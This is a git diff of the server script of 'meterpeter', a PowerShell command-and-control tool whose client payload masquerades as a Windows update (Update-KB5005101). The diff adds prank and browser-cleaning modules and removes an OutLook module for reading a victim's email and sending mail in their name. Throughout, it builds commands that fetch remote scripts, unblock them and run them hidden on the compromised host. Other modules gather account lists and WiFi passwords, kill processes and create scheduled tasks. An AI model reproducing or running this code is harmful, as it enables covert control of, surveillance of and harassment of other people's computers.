@@ -4,14 +4,14 @@
 #   Required Dependencies: Invoke-WebRequest
 #   Optional Dependencies: BitsTransfer|Python
 #   PS cmdlet Dev version: v2.10.13
-#   PS cmdlet sub version: v2.10.13.5
+#   PS cmdlet sub version: v2.10.13.6
 #   GitHub: https://github.com/r00t-3xp10it/meterpeter/releases
 ##
 
 $SserverTime = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
 $HTTP_PORT = "8087"                 # Python http.server LPort (optional)
 $CmdLetVersion = "2.10.13"          # meterpeter C2 version (dont change)
-$DeveloVersion = "2.10.13.4"        # meterpeter C2 dev version (dont change)
+$DeveloVersion = "2.10.13.6"        # meterpeter C2 dev version (dont change)
 $payload_name = "Update-KB5005101"  # Client-payload filename (dont change)
 $Dropper_Name = "Update-KB5005101"  # Payload-dropper filename (optional)
 
@@ -746,16 +746,21 @@ $Client = $Socket.AcceptTcpClient();
 $Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString
 Write-Host "[-] Beacon received: $Remote_Host" -ForegroundColor Green
 
-$AllSettings = Get-NetAdapter | Select-Object * | Where-Object { $_.Status -iMatch '^(Up)$' }
-$Netsped = ($AllSettings).LinkSpeed
-$NetName = ($AllSettings).Name
 
-Write-Host "`n`n    Adapter: $NetName  Speed: $Netsped"
-Write-Host "    Connection: [" -NoNewline
-Write-Host "$Local_Host" -ForegroundColor Green -NoNewline
-Write-Host "] => [" -NoNewline
-Write-Host "$Remote_Host" -ForegroundColor Red -NoNewline
-Write-Host "]"
+## Connection Banner
+$ConnectionBanner = @"
+
+    _____________           _____________
+   |.-----------.|         |.-----------.|
+   ||           ||         ||           ||
+   ||   Local   ||  <==>   ||   Remote  ||  
+   ||___________||         ||___________||
+   __'---------'__         __'---------'__
+  [:::: ::::::::::]       [:::::::::: ::::]
+"@;
+write-host $ConnectionBanner
+write-host "    $Local_Host" -ForegroundColor Green -NoNewline
+write-host "            $Remote_Host`n" -ForegroundColor Red
 
 
 #Play sound on session creation
@@ -780,7 +785,7 @@ $RegisteredUser = Char_Obf("(Get-CimInstance -ClassName Win32_OperatingSystem).R
 $BootUpTime = Char_Obf("(Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime.ToString()");
 
 #Sysinfo command at first time run (connection)
-$Command = "cd `$Env:TMP;`"    DomainName     : `"+$Name+`"``n    Architecture   : `"+$Architecture+`"``n    RemoteHost     : `"+`"$Remote_Host`"+`"``n    BootUpTime     : `"+$BootUpTime+`"``n    RegisteredUser : `"+$RegisteredUser+`"``n    OP System      : `"+$System+`"``n    OP Version     : `"+$Version+`"``n    SystemDir      : `"+$syst_dir+`"``n    WorkingDir     : `"+$RhostWorkingDir+`"``n    ProcessorCPU   : `"+$Processor;If(Get-Process wscript -EA SilentlyContinue){Stop-Process -Name wscript -Force}";
+$Command = "cd `$Env:TMP;`"      DomainName     : `"+$Name+`"``n      Architecture   : `"+$Architecture+`"``n      RemoteHost     : `"+`"$Remote_Host`"+`"``n      BootUpTime     : `"+$BootUpTime+`"``n      RegisteredUser : `"+$RegisteredUser+`"``n      OP System      : `"+$System+`"``n      OP Version     : `"+$Version+`"``n      SystemDir      : `"+$syst_dir+`"``n      WorkingDir     : `"+$RhostWorkingDir+`"``n      ProcessorCPU   : `"+$Processor;If(Get-Process wscript -EA SilentlyContinue){Stop-Process -Name wscript -Force}";
 
 
 While($Client.Connected)
@@ -808,7 +813,7 @@ While($Client.Connected)
 
     If($Command -ieq "Info")
     {
-      Write-Host "`n$Info";
+      Write-Host "`n`n$Info";
       $Command = $Null;
     }
 
@@ -853,12 +858,37 @@ While($Client.Connected)
       write-host "   Speak          Make remote host speak one frase";
       write-host "   OpenUrl        Open\spawn URL in default browser";
       write-host "   GoogleX        Browser google easter eggs manager";
+      write-host "   WindowsUpdate  Fake windows update full screen prank";
       write-host "   CriticalError  Prank that fakes a critical system error";
       write-host "   Nodrives       Hide All Drives (C:D:E:F:G) From Explorer";
       write-host "   LabelDrive     Rename drive letter (C:) label From Explorer";
       write-host "   Return         Return to Server Main Menu" -ForeGroundColor yellow
       write-host "`n`n :meterpeter:Pranks> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
+      If($choise -ieq "WindowsUpdate" -or $choise -ieq "WU")
+      {
+         write-host "`n`n   Description:" -ForegroundColor Yellow
+         write-host "   This module opens the target default web browser in fakeupdate.net"
+         write-host "   in full screen mode. Faking that one windows update its occuring."
+         write-host "   Remark: Target requires to press F11 to exit full screen prank." -ForegroundColor Yellow
+         write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
+         write-host "   -------  -----------                  -------------------";
+         write-host "   Start    execute prank in background  UserLand";
+         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
+         write-host "`n`n :meterpeter:Pranks:WU> " -NoNewline -ForeGroundColor Green;
+         $Prank_choise = Read-Host;
+         If($Prank_choise -ieq "Start")
+         {
+            write-host " * Faking windows system update ..`n" -ForegroundColor Green;Start-Sleep -Seconds 1
+            $Command = "powershell cd `$Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FWUprank.ps1' -OutFile 'FWUprank.ps1'|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList '-file FWUprank.ps1 -autodelete on';echo '   `> Windows system update prank running in background!' `> trash.mtp;Get-Content trash.mtp;Remove-Item trash.mtp -Force"
+         }
+         If($Prank_choise -ieq "Return" -or $Prank_choise -ieq "cls" -or $Prank_choise -ieq "modules" -or $Prank_choise -ieq "clear")
+         {
+            $choise = $Null;
+            $Command = $Null;
+            $Prank_choise = $Null;
+         }
+      }
       If($choise -ieq "LabelDrive" -or $choise -ieq "Label")
       {
         write-host "`n`n   Description:" -ForegroundColor Yellow;
@@ -874,18 +904,18 @@ While($Client.Connected)
         If($choise_two -ieq "List")
         {
            write-host " * Listing all drives available .." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n";
-           $Command = "`$PSVERSION = (`$Host).version.Major;If(`$PSVERSION -gt 5){Get-PSDrive -PSProvider 'FileSystem'|Select-Object Root,CurrentLocation,Used,Free|ft|Out-File dellog.txt}Else{Get-Volume|Select-Object DriveLetter,FileSystemLabel,FileSystemType,HealthStatus,SizeRemaining,Size|FT|Out-File dellog.txt};Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+           $Command = "`$PSVERSION = (`$Host).version.Major;If(`$PSVERSION -gt 5){Get-PSDrive -PSProvider 'FileSystem'|Select-Object Root,CurrentLocation,Used,Free|ft|Out-File dellog.txt}Else{Get-Volume|Select-Object DriveLetter,FileSystemLabel,FileSystemType,DriveType,HealthStatus,SizeRemaining,Size|FT|Out-File dellog.txt};Get-Content dellog.txt;Remove-Item dellog.txt -Force";
         }
         If($choise_two -ieq "Rename")
         {
-          $MyDrive = Read-Host " - DriveLetter to change the label (C): "
-          $MyDName = Read-Host " - Drive new Friendly Name (Armagedon): "
+          $MyDrive = Read-Host " - DriveLetter to change the label (C)"
+          $MyDName = Read-Host " - Drive new Friendly Name (Armagedon)"
           write-host " * Rename Drive ${MyDrive}: label to [" -ForegroundColor Green -NoNewline
           write-host "$MyDName" -ForegroundColor Red -NoNewline;
           write-host "]" -ForegroundColor Green;
           
           Start-Sleep -Seconds 1;write-host "`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Volume -DriveLetter $MyDrive -NewFileSystemLabel `"$MyDName`";Start-Sleep -Seconds 1;Get-Volume -DriveLetter $MyDrive|Select-Object DriveLetter,FileSystemLabel,FileSystemType,HealthStatus,SizeRemaining,Size|FT}Else{echo `"   [i] Client Admin Privileges Required (run as administrator)``n`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){If(-not(Test-Path -Path `"${MyDrive}:`")){echo `"   [${MyDrive}:] Drive letter not found ..``n`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}Set-Volume -DriveLetter $MyDrive -NewFileSystemLabel `"$MyDName`";Start-Sleep -Seconds 1;Get-Volume -DriveLetter $MyDrive|Select-Object DriveLetter,FileSystemLabel,FileSystemType,HealthStatus,SizeRemaining,Size|FT}Else{echo `"   [i] Client Admin Privileges Required (run as administrator)``n`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
         }
         If($choise_two -ieq "Return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "clear")
         {
@@ -901,9 +931,9 @@ While($Client.Connected)
         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
         write-host "   -------   -----------                     -------------------";
         write-host "   Disable   Hide Drives from explorer       " -NoNewline;
-        write-host "Administrator" -ForegroundColor DarkYellow;
+        write-host "Administrator" -ForegroundColor Red;
         write-host "   Enable    Show Drives in Explorer         "  -NoNewline;
-        write-host "Administrator" -ForegroundColor DarkYellow;
+        write-host "Administrator" -ForegroundColor Red;
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Pranks:NoDrives> " -NoNewline -ForeGroundColor Green;
         $choise_two = Read-Host;
@@ -925,9 +955,9 @@ While($Client.Connected)
       }
       If($choise -ieq "CriticalError")
       {
-         $MaxInteractions = Read-Host " - How many times to loop prank?  "
-         $DelayTime = Read-Host " - The delay time between loops?  "
-         $bsodwallpaper = Read-Host " - Modify wallpaper to BSOD? (y|n)"
+         $MaxInteractions = Read-Host " - How many times to loop prank?  (8) "
+         [int]$DelayTime = Read-Host " - The delay time between loops?  (6) "
+         $bsodwallpaper = Read-Host " - Modify the wallpaper to BSOD? (y|n)"
          If($bsodwallpaper -iMatch '^(n|no)$' -or $bsodwallpaper -eq $null)
          {
             $bsodwallpaper = "false"
@@ -937,13 +967,21 @@ While($Client.Connected)
             $bsodwallpaper = "true"            
          }
 
-         If(-not($DelayTime) -or $DelayTime -eq $null){[int]$DelayTime = "200"}
-         If(-not($MaxInteractions) -or $MaxInteractions -eq $null){[int]$MaxInteractions = "20"}
+         If([int]$DelayTime -gt 30){[int]$DelayTime = '8'}
+         If([int]$MaxInteractions -gt 30){$MaxInteractions = "20"}
+         If([string]::IsNullOrEmpty($DelayTime)){[int]$DelayTime = '8'}
+         If([string]::IsNullOrEmpty($MaxInteractions)){$MaxInteractions = "20"}
+
          Write-Host " * Faking a critical system error (bsod)" -ForegroundColor Green
          Write-Host "   => takes aprox 30 seconds to run`n`n" -ForegroundColor DarkYellow
 
          write-host "   Executing BSOD prank in background." -ForegroundColor Green
-         write-host "   MaxInteractions:$MaxInteractions DelayTime:$DelayTime(sec)`n" -ForegroundColor DarkGray;
+         write-host "   MaxInteractions:[" -ForegroundColor DarkGray -NoNewline
+         write-host "$MaxInteractions" -ForegroundColor Red -NoNewline
+         write-host "] DelayTime:[" -ForegroundColor DarkGray -NoNewline
+         write-host "$DelayTime" -ForegroundColor Red -NoNewline
+         write-host "](sec)`n" -ForegroundColor DarkGray;
+
          If($bsodwallpaper -ieq "true")
          {
             write-host "   Wallpaper Path : `$Env:TMP\bsod.png" -ForegroundColor DarkGray;
@@ -952,7 +990,7 @@ While($Client.Connected)
          }
 
          #Execute remote command
-         $Command = "powershell cd `$Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/C2Prank.ps1' -OutFile 'C2Prank.ps1'|Unblock-File;Start-Process -windowstyle hidden powershell -ArgumentList '-file C2Prank.ps1 -MaxInteractions $MaxInteractions -DelayTime $DelayTime -bsodwallpaper $bsodwallpaper'"
+         $Command = "powershell cd `$Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/C2Prank.ps1' -OutFile 'C2Prank.ps1'|Unblock-File;Start-Process -windowstyle hidden powershell -ArgumentList '-file C2Prank.ps1 -MaxInteractions $MaxInteractions -DelayTime $DelayTime'"
       }
       If($choise -ieq "msgbox")
       {
@@ -1261,7 +1299,7 @@ While($Client.Connected)
       {
          write-host "`n`n   Description:" -ForegroundColor Yellow
          write-host "   This module enumerate ESTABLISHED TCP\UDP connections"
-         write-host "   DNS Address Ip address and Hotnames, TCP Routing Table"
+         write-host "   DNS Address Ip address, Hotnames and TCP Routing Table"
          write-host "`n`n   Modules  Description                    Privileges Required" -ForegroundColor green;
          write-host "   -------  -----------                    -------------------";
          write-host "   Stats    Query IPv4 Statistics          UserLand";
@@ -1322,7 +1360,7 @@ While($Client.Connected)
         }
         If($wifi_choise -ieq "SSIDPass" -or $wifi_choise -ieq "pass")
         {
-          write-host " - Sellect WIFI Profile: " -NoNewline;
+          write-host " - Sellect WIFI Profile: " -ForegroundColor Red -NoNewline;
           $profile = Read-Host;
           If(-not ($profile) -or $profile -eq " ")
           {
@@ -1360,7 +1398,7 @@ While($Client.Connected)
          $ping_choise = Read-Host;
          If($ping_choise -ieq "Enum")
          {
-            Write-Host " - Ip addr range to scan (1,255): " -NoNewline
+            Write-Host " - Ip addr range to scan (1,255): " -ForegroundColor Red -NoNewline
             $IpRange = Read-Host;
             If($IpRange -eq $null -or $IpRange -NotMatch ',')
             {
@@ -1380,7 +1418,7 @@ While($Client.Connected)
          }
          If($ping_choise -ieq "PortScan")
          {
-            Write-Host " - Input ip address to scan ($Local_Host) : " -NoNewline
+            Write-Host " - Input ip address to scan ($Local_Host) : " -ForegroundColor Red -NoNewline
             $IpRange = Read-Host;
             If($IpRange -NotMatch '^(\d+\d+\d+)\.(\d+\d+\d+).')
             {
@@ -1495,7 +1533,6 @@ While($Client.Connected)
       write-host "   StartUp     List remote host startUp directory";
       write-host "   ListRun     List remote host startup run entrys";
       write-host "   AntiVirus   Enumerate all EDR Products installed";
-      write-host "   OutLook     Manage OutLook Exchange Email Objects";
       write-host "   FRManager   Manage remote 'active' firewall rules";
       write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Adv> " -NoNewline -ForeGroundColor Green;
@@ -1504,7 +1541,7 @@ While($Client.Connected)
       If($choise -ieq "Accounts" -or $choise -ieq "acc")
       {
          write-host " * Listing remote host accounts." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
-         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Name,PasswordRequired,PasswordChangeable,Caption|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt|Select -Skip 1|Select -SkipLast 2;If(-not(`$Out)){echo `"   [x] Error: cmdlet cant retrive remote host accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force"
+         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Name,Caption,PasswordRequired,PasswordChangeable|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt|Select -Skip 1|Select -SkipLast 2;If(-not(`$Out)){echo `"   [x] Error: cmdlet cant retrive remote host accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force"
       }
       If($choise -ieq "RevShell" -or $choise -ieq "Shell")
       {
@@ -1525,7 +1562,8 @@ While($Client.Connected)
          write-host "   Check      List Remote Processe(s) Running    UserLand";
          write-host "   Query      Process name verbose information   UserLand";
          write-host "   DllSearch  List DLLs loaded by processes      UserLand";
-         write-host "   Kill       Kill Remote Process From Running   Administrator";
+         write-host "   Kill       Kill Remote Process From Running   " -NoNewline
+         write-host "Administrator" -ForegroundColor Red;
          write-host "   Return     Return to Server Main Menu" -ForeGroundColor yellow;
          write-host "`n`n :meterpeter:Adv:Proc> " -NoNewline -ForeGroundColor Green;
          $wifi_choise = Read-Host;
@@ -1541,20 +1579,18 @@ While($Client.Connected)
             }
             Else
             {
-               $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetProcess.ps1`" -OutFile `"`$Env:TMP\GetProcess.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\GetProcess.ps1`" -GetProcess Enum -ProcessName `"$Proc_name`" -verb true -exclude 'false';Remove-Item -Path `$Env:TMP\GetProcess.ps1 -Force";
+               $Command = "`$ProcessId = (Get-Process -Name `"$Proc_name`").Id;iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetProcess.ps1`" -OutFile `"`$Env:TMP\GetProcess.ps1`"|Unblock-File;iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Get-TokenPrivs.ps1`" -OutFile `"`$Env:TMP\Get-TokenPrivs.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\GetProcess.ps1`" -GetProcess Enum -ProcessName `"$Proc_name`" -verb true -exclude 'false';powershell -File `"`$Env:TMP\Get-TokenPrivs.ps1`" -ProcID `$ProcessId;Remove-Item -Path `$Env:TMP\Get-TokenPrivs.ps1 -Force;Remove-Item -Path `$Env:TMP\GetProcess.ps1 -Force";
             }
          }
          If($wifi_choise -ieq "DllSearch")
          {
-               write-host ""
-               $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DLLSearch.ps1`" -OutFile `"`$Env:TMP\DLLSearch.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\DLLSearch.ps1`" -filter 'all';Remove-Item -Path `$Env:TMP\DLLSearch.ps1 -Force";         
+            write-host " * List DLL's loaded by processes.`n" -ForegroundColor Green
+            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DLLSearch.ps1`" -OutFile `"`$Env:TMP\DLLSearch.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\DLLSearch.ps1`" -filter 'all';Remove-Item -Path `$Env:TMP\DLLSearch.ps1 -Force";         
          }
          If($wifi_choise -ieq "Check")
          {
             write-host " * List remote processe(s) running." -ForegroundColor Green
-            write-host "   => " -ForegroundColor Yellow -NoNewline
-            write-host "exclude: " -ForegroundColor DarkGray -NoNewline
-            write-host "SrTasks|wlanext|svchost|RuntimeBroker`n"
+            write-host "   => exclude: SrTasks|wlanext|svchost|RuntimeBroker`n" -ForegroundColor Yellow
             
             Start-Sleep -Seconds 1
             $Command = "Get-Process|Select-Object Id,ProcessName,Description,ProductVersion|Where-Object{`$_.ProcessName -iNotMatch '(wlanext`|svchost`|RuntimeBroker`|SrTasks)'}|Format-Table -AutoSize|Out-File dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not(`$check_tasks)){echo `"   cmdlet failed to retrieve processes List ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}Else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
@@ -1566,7 +1602,7 @@ While($Client.Connected)
             $KillChoise = Read-Host
             If(-not($KillChoise) -or $KillChoise -iMatch '(n|ProcessName)')
             {
-               Write-Host " - The process name to kill     : " -NoNewline
+               Write-Host " - The process name to kill     : " -ForegroundColor Red -NoNewline
                $Proc_name = Read-Host
                If(-not ($proc_name) -or $Proc_name -ieq " ")
                {
@@ -1577,7 +1613,7 @@ While($Client.Connected)
                Else
                {
 
-                  Write-Host " - Exclude PID from kill? (y|n) : " -NoNewline
+                  Write-Host " - Exclude PID from kill? (y|n) : " -ForegroundColor Red -NoNewline
                   $Exclusion = Read-Host
                   If(-not($Exclusion) -or $Exclusion -iMatch '(n|no)')
                   {
@@ -1585,7 +1621,7 @@ While($Client.Connected)
                   }
                   Else
                   {
-                     Write-Host " - Input process PID number     : " -NoNewline
+                     Write-Host " - Input process PID number     : " -ForegroundColor Red -NoNewline
                      $Dontkill = Read-Host
                      If(-not ($Dontkill) -or $Dontkill -ieq " ")
                      {
@@ -1599,7 +1635,7 @@ While($Client.Connected)
             }
             Else
             {
-               Write-Host " - PID of the process to kill   : " -NoNewline
+               Write-Host " - PID of the process to kill   : " -ForegroundColor Red -NoNewline
                $Proc_name = Read-Host
                If(-not ($proc_name) -or $Proc_name -ieq " ")
                {
@@ -1642,7 +1678,7 @@ While($Client.Connected)
          }
          If($my_choise -ieq "Query")
          {
-            write-Host " - Input TaskName: " -NoNewline -ForegroundColor DarkYellow
+            write-Host " - Input TaskName: " -NoNewline -ForegroundColor Red
             $TaskName = Read-Host
 
             If(-not($TaskName))
@@ -1656,7 +1692,7 @@ While($Client.Connected)
          }
          If($my_choise -ieq "RunOnce")
          {
-            write-Host " - Input TaskName to create: " -NoNewline -ForegroundColor DarkYellow
+            write-Host " - Input TaskName to create: " -NoNewline -ForegroundColor Red
             $TaskName = Read-Host
             If(-not($TaskName))
             {
@@ -1664,7 +1700,7 @@ While($Client.Connected)
                write-host "   => Wrong setting, set TaskName to: $TaskName" -ForegroundColor Red               
             }
 
-            write-Host " - Input StartTime (13:45) : " -NoNewline -ForegroundColor DarkYellow
+            write-Host " - Input StartTime (13:45) : " -NoNewline
             $StartTime = Read-Host
             If(-not($StartTime))
             {
@@ -1672,7 +1708,7 @@ While($Client.Connected)
                write-host "   => Wrong setting, set starttime to: $StartTime" -ForegroundColor Red
             }
 
-            write-Host " - Input Command|BinaryPath: " -NoNewline -ForegroundColor DarkYellow
+            write-Host " - Input Command|BinaryPath: " -NoNewline
             $Execute = Read-Host
             If(-not($Execute))
             {
@@ -1685,7 +1721,7 @@ While($Client.Connected)
          }
          If($my_choise -ieq "LoopExec")
          {
-            write-Host " - Input Task Name to create   : " -NoNewline -ForegroundColor DarkYellow
+            write-Host " - Input Task Name to create   : " -NoNewline -ForegroundColor Red
             $TaskName = Read-Host;
             If(-not($TaskName))
             {
@@ -1693,7 +1729,7 @@ While($Client.Connected)
                write-host "   => Wrong setting, set TaskName to: $TaskName" -ForegroundColor Red                
             }
 
-            write-Host " - Execute task after (minuts) : " -NoNewline -ForegroundColor DarkYellow
+            write-Host " - Execute task after (minuts) : " -NoNewline
             $Interval = Read-Host
             If(-not($Interval))
             {
@@ -1701,7 +1737,7 @@ While($Client.Connected)
                write-host "   => Wrong setting, set Interval to: $Interval" -ForegroundColor Red                 
             }
 
-            write-Host " - Task Duration (1 TO 9 Hours): " -NoNewline -ForegroundColor DarkYellow
+            write-Host " - Task Duration (1 TO 9 Hours): " -NoNewline
             $Duration = Read-Host
             If(-not($Duration))
             {
@@ -1710,7 +1746,7 @@ While($Client.Connected)
                
             }
 
-            write-Host " - Input Command|Binary Path   : " -NoNewline -ForegroundColor DarkYellow
+            write-Host " - Input Command|Binary Path   : " -NoNewline -ForegroundColor Red
             $Execute = Read-Host
             If(-not($Execute))
             {
@@ -1751,11 +1787,12 @@ While($Client.Connected)
          write-host "`n`n   Description:" -ForegroundColor Yellow;
          write-host "   Enumerates remote host default browsers\versions";
          write-host "   Supported: Ie,Edge,Firefox,Chrome,Opera,Safari,Brave" -ForeGroundColor yellow;
-         write-host "`n`n   Modules     Description                   Privileges Required" -ForegroundColor green;
-         write-host "   -------     -----------                   ------------------";
-         write-host "   Start       Enumerating remote browsers   UserLand";
-         write-host "   addons      Enumerating browsers addons   UserLand";
-         write-host "   Verbose     Enumerating browsers (slow)   UserLand";
+         write-host "`n`n   Modules     Description                     Privileges Required" -ForegroundColor green;
+         write-host "   -------     -----------                     ------------------";
+         write-host "   Start       Enumerating remote browsers     UserLand";
+         write-host "   addons      Enumerating browsers addons     UserLand";
+         write-host "   Verbose     Enumerating browsers (slow)     UserLand";
+         write-host "   Clean       Major browsers temporary files  UserLand";
          write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
          write-host "`n`n :meterpeter:Adv:Browser> " -NoNewline -ForeGroundColor Green;
          $Enumerate_choise = Read-Host;
@@ -1774,6 +1811,22 @@ While($Client.Connected)
            write-host " * Installed browsers verbose query." -ForegroundColor Green
            write-host "   => This function takes aprox 1 minute to finish." -ForegroundColor DarkYellow
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -ALL;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
+         }
+         If($Enumerate_choise -ieq "Clean")
+         {
+           write-host " - Use ClearMyTracksByProcess? (y|n): " -ForeGroundColor Red -NoNewline;
+           $ClearMyTracksByProcess = Read-Host;
+
+           write-host " * Clean major browsers temporary files .." -ForegroundColor Green
+           If($ClearMyTracksByProcess -iMatch '^(y|yes)$')
+           {
+              write-host "   => Extra: invoking InetCpl to clean files." -ForeGroundColor DarkYellow;
+              $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;((Get-Content -Path `"`$Env:TMP\GetBrowsers.ps1`" -Raw) -Replace `"RUIUIUi0 = 'no'`",`"RUIUIUi0 = 'yes'`")|Set-Content -Path `"`$Env:TMP\GetBrowsers.ps1`";powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -CLEAN;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"           
+           }
+           Else
+           {
+              $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -CLEAN;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
+           }
          }
          If($Enumerate_choise -ieq "Return" -or $Enumerate_choise -ieq "cls" -or $Enumerate_choise -ieq "Modules" -or $Enumerate_choise -ieq "clear")
          {
@@ -1852,177 +1905,7 @@ While($Client.Connected)
            $Command = $Null;
            $my_choise = $Null;
          }
-      }
-      If($choise -ieq "OutLook")
-      {
-         write-host "`n`n   Description:" -ForegroundColor Yellow;
-         write-host "   Module to enumerate OutLook Exchange Emails, Read is contents";
-         write-host "   on terminal console or dump found Email Objects to a logfile.";
-         write-host "   If invoked -SemdMail then target address will be used as Sender." -ForegroundColor Yellow;
-         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
-         write-host "   -------   -----------                     ------------------";
-         write-host "   Folders   Display outlook folder names    UserLand";
-         write-host "   Contacts  Display outlook contacts info   UserLand";
-         write-host "   Emails    Display outlook email objects   UserLand";
-         write-host "   Filter    SenderName objects <Info|Body>  UserLand";
-         write-host "   SendMail  Send Email using target domain  UserLand";
-         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-         write-host "`n`n :meterpeter:Adv:OutLook> " -NoNewline -ForeGroundColor Green;
-         $OutLook_choise = Read-Host;
-         If($OutLook_choise -ieq "Folders")
-         {
-            #Execute command remotely
-            Write-Host " * Scanning OutLook for folder names!" -ForegroundColor Green
-            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'folders' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}";
-         }
-         If($OutLook_choise -ieq "Contacts")
-         {
-            Write-Host " - Max outlook items to display: " -NoNewline;
-            $MaxOfObjectsToDisplay = Read-Host;
-            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
-            {
-               $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
-            }
-
-            Write-Host " - Create report logfile? (y|n): " -NoNewline;
-            $CreateLogFileSetting = Read-Host;
-            If($CreateLogFileSetting -iMatch '^(y|yes)$')
-            {
-               $CreateLogFileSetting = "True"
-            }
-            Else
-            {
-               $CreateLogFileSetting = "False"            
-            }
-
-            #Execute command remotely
-            Write-Host " * Scanning OutLook for Contact Objects" -ForegroundColor Green
-            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'contacts' -maxitems '$MaxOfObjectsToDisplay' -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if RealTimeProtection its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
-         }
-         If($OutLook_choise -ieq "Emails")
-         {
-            Write-Host " - Max outlook items to display: " -NoNewline;
-            $MaxOfObjectsToDisplay = Read-Host;
-            If(-not($MaxOfObjectsToDisplay) -or $MaxOfObjectsToDisplay -ieq $null)
-            {
-               $MaxOfObjectsToDisplay = "5" #Default cmdlet parameter
-            }
-
-            Write-Host " - Display message <BODY> (y|n): " -NoNewline;
-            $UseVerbose = Read-Host;
-            If($UseVerbose -iMatch '^(y|yes)$')
-            {
